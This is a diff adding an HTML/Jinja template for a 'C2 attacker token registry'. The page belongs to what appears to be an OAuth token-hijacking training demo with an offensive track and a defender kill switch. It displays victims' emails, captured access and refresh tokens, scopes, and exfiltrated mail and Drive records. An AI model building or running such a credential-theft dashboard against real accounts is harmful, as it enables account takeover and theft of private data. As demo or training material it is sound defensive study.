@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>C2 — Token Registry</title>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg: #080808; --surface: #0f0f0f; --border: #1a1a1a;
+      --green: #00e676; --red: #ff1744; --yellow: #ffea00;
+      --dim: #333; --muted: #555; --text: #ccc;
+    }
+    body {
+      background: var(--bg); color: var(--text);
+      font-family: 'JetBrains Mono', monospace;
+      padding: 0; min-height: 100vh;
+    }
+
+    /* scanline effect */
+    body::before {
+      content: '';
+      position: fixed; inset: 0; z-index: 9999; pointer-events: none;
+      background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px);
+    }
+
+    /* ── Header bar ── */
+    .topbar {
+      background: #000; border-bottom: 1px solid #1a1a1a;
+      padding: 12px 28px;
+      display: flex; align-items: center; justify-content: space-between;
+    }
+    .topbar-left { display: flex; align-items: center; gap: 16px; }
+    .topbar-title { font-size: 13px; font-weight: 700; color: var(--green); letter-spacing: 2px; }
+    .topbar-sub { font-size: 10px; color: var(--muted); letter-spacing: 1px; }
+    .blink { animation: blink 1.2s step-end infinite; }
+    @keyframes blink { 50% { opacity: 0; } }
+    .refresh-badge {
+      font-size: 10px; color: var(--muted);
+      border: 1px solid var(--border); border-radius: 2px; padding: 2px 8px;
+    }
+
+    /* ── Main layout ── */
+    .main { padding: 24px 28px; }
+
+    /* ── Stats row ── */
+    .stats-row {
+      display: grid; grid-template-columns: repeat(4, 1fr);
+      gap: 12px; margin-bottom: 28px;
+    }
+    .stat-box {
+      background: var(--surface); border: 1px solid var(--border);
+      border-radius: 4px; padding: 16px 18px;
+    }
+    .stat-box.danger { border-color: #3a0a0a; }
+    .stat-num {
+      font-size: 28px; font-weight: 700; line-height: 1;
+      margin-bottom: 4px;
+    }
+    .stat-num.green { color: var(--green); }
+    .stat-num.red   { color: var(--red); }
+    .stat-num.yellow{ color: var(--yellow); }
+    .stat-num.muted { color: var(--muted); }
+    .stat-label { font-size: 9px; color: var(--muted); letter-spacing: 1.5px; text-transform: uppercase; }
+
+    /* ── Section header ── */
+    .section-hdr {
+      font-size: 10px; color: var(--muted); letter-spacing: 2px;
+      text-transform: uppercase; margin-bottom: 12px;
+      display: flex; align-items: center; gap: 10px;
+    }
+    .section-hdr::after { content: ''; flex: 1; height: 1px; background: var(--border); }
+
+    /* ── Token cards ── */
+    .token-list { display: flex; flex-direction: column; gap: 10px; margin-bottom: 32px; }
+    .token-card {
+      background: var(--surface); border: 1px solid var(--border);
+      border-left: 3px solid; border-radius: 4px; padding: 18px 20px;
+      transition: border-color 0.2s;
+    }
+    .token-card.active  { border-left-color: var(--green); }
+    .token-card.evicted { border-left-color: var(--red); opacity: 0.45; }
+    .token-card.new-flash { animation: flash 1s ease-out; }
+    @keyframes flash {
+      0%   { background: #001a00; }
+      100% { background: var(--surface); }
+    }
+
+    .card-top {
+      display: flex; align-items: center; gap: 12px; margin-bottom: 14px;
+    }
+    .status-pill {
+      font-size: 9px; font-weight: 700; letter-spacing: 1.5px;
+      padding: 3px 10px; border-radius: 2px; text-transform: uppercase;
+    }
+    .status-pill.active  { background: #001a00; color: var(--green); border: 1px solid #003300; }
+    .status-pill.evicted { background: #1a0000; color: var(--red);   border: 1px solid #330000; }
+    .card-id    { font-size: 11px; color: var(--dim); }
+    .card-time  { margin-left: auto; font-size: 10px; color: var(--muted); }
+
+    .card-grid {
+      display: grid; grid-template-columns: repeat(2, 1fr);
+      gap: 10px 24px; margin-bottom: 14px;
+    }
+    .card-field {}
+    .field-label { font-size: 9px; color: var(--muted); letter-spacing: 1px; margin-bottom: 3px; }
+    .field-value { font-size: 12px; color: var(--text); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+    .field-value.bright { color: #eee; }
+    .field-value.danger { color: var(--red); }
+    .field-value.warn   { color: var(--yellow); }
+
+    .scope-row { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 14px; }
+    .scope-tag {
+      font-size: 9px; padding: 2px 8px; border-radius: 2px;
+      background: #1a0a00; color: #ff8c00; border: 1px solid #2a1500;
+    }
+
+    /* Exfil section */
+    .exfil-section { border-top: 1px solid var(--border); padding-top: 12px; }
+    .exfil-hdr {
+      font-size: 9px; color: var(--muted); letter-spacing: 1px;
+      margin-bottom: 8px; text-transform: uppercase;
+    }
+    .exfil-item {
+      font-size: 11px; color: #888; padding: 4px 0;
+      border-bottom: 1px solid #111;
+      display: grid; grid-template-columns: 60px 1fr;
+      gap: 8px;
+    }
+    .exfil-type { color: var(--muted); }
+    .exfil-val  { color: #aaa; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+
+    /* Empty state */
+    .empty {
+      text-align: center; padding: 60px 0;
+      color: var(--dim); font-size: 12px; letter-spacing: 1px;
+    }
+    .empty .big { font-size: 40px; margin-bottom: 12px; opacity: 0.3; }
+  </style>
+  <!-- Auto-refresh every 3 seconds to show new captures -->
+  <meta http-equiv="refresh" content="3">
+</head>
+<body>
+  <div class="topbar">
+    <div class="topbar-left">
+      <div>
+        <div class="topbar-title">[ C2 — ATTACKER TOKEN REGISTRY ] <span class="blink">█</span></div>
+        <div class="topbar-sub">OFFENSIVE TRACK · OAuth Token Hijacking Demo · Port 5001</div>
+      </div>
+    </div>
+    <div class="refresh-badge">AUTO-REFRESH 3s</div>
+  </div>
+
+  <div class="main">
+    <!-- Stats -->
+    <div class="stats-row">
+      <div class="stat-box">
+        <div class="stat-num green">{{ tokens | length }}</div>
+        <div class="stat-label">Total Captured</div>
+      </div>
+      <div class="stat-box danger">
+        <div class="stat-num red">{{ tokens | selectattr('status', 'equalto', 'active') | list | length }}</div>
+        <div class="stat-label">Active (Usable)</div>
+      </div>
+      <div class="stat-box">
+        <div class="stat-num yellow">{{ tokens | selectattr('has_refresh', 'equalto', true) | list | length }}</div>
+        <div class="stat-label">With Refresh Token</div>
+      </div>
+      <div class="stat-box">
+        <div class="stat-num muted">{{ tokens | selectattr('status', 'equalto', 'evicted') | list | length }}</div>
+        <div class="stat-label">Evicted by Defender</div>
+      </div>
+    </div>
+
+    <!-- Token list -->
+    <div class="section-hdr">captured credentials</div>
+
+    {% if not tokens %}
+    <div class="empty">
+      <div class="big">◉</div>
+      No tokens captured yet.<br>
+      Send a victim to <strong style="color:#555">http://localhost:5001/</strong>
+    </div>
+    {% endif %}
+
+    <div class="token-list">
+      {% for t in tokens %}
+      <div class="token-card {{ t.status }} {% if highlight == t.id and is_new %}new-flash{% endif %}">
+        <div class="card-top">
+          <span class="status-pill {{ t.status }}">
+            {% if t.status == 'active' %}● LIVE{% else %}○ EVICTED{% endif %}
+          </span>
+          <span class="card-id">TKN-{{ t.id }}</span>
+          <span class="card-time">{{ t.captured_at_display }}</span>
+        </div>
+
+        <div class="card-grid">
+          <div class="card-field">
+            <div class="field-label">victim email</div>
+            <div class="field-value bright">{{ t.email }}</div>
+          </div>
+          <div class="card-field">
+            <div class="field-label">refresh token</div>
+            <div class="field-value {% if t.has_refresh %}warn{% else %}muted{% endif %}">
+              {% if t.has_refresh %}OBTAINED — persistent access granted{% else %}not issued{% endif %}
+            </div>
+          </div>
+          <div class="card-field">
+            <div class="field-label">access token preview</div>
+            <div class="field-value">{{ t.access_token_preview }}</div>
+          </div>
+          <div class="card-field">
+            <div class="field-label">captured at</div>
+            <div class="field-value">{{ t.captured_at }}</div>
+          </div>
+          {% if t.status == 'evicted' %}
+          <div class="card-field">
+            <div class="field-label">evicted at</div>
+            <div class="field-value danger">{{ t.evicted_at }} — kill switch fired by defender</div>
+          </div>
+          {% endif %}
+        </div>
+
+        <div class="scope-row">
+          {% for s in t.scopes %}
+          <span class="scope-tag">{{ s.split('/')[-1] if '/' in s else s }}</span>
+          {% endfor %}
+        </div>
+
+        {% if t.exfil_data %}
+        <div class="exfil-section">
+          <div class="exfil-hdr">exfiltrated data ({{ t.exfil_data | length }} records)</div>
+          {% for item in t.exfil_data[:6] %}
+          <div class="exfil-item">
+            <span class="exfil-type">[{{ item.type }}]</span>
+            <span class="exfil-val">
+              {% if item.type == 'email' %}{{ item.subject }} — from {{ item.from }}
+              {% elif item.type == 'drive' %}{{ item.name }} ({{ item.mime }}, {{ item.size_kb }} KB)
+              {% elif item.type == 'profile' %}{{ item.email }} · {{ item.total_messages }} messages
+              {% elif item.error is defined %}ERROR: {{ item.error }}
+              {% endif %}
+            </span>
+          </div>
+          {% endfor %}
+        </div>
+        {% else %}
+        <div class="exfil-section">
+          <div class="exfil-hdr" style="color:#2a2a2a">exfiltration pending...</div>
+        </div>
+        {% endif %}
+      </div>
+      {% endfor %}
+    </div>
+  </div>
+</body>
+</html>
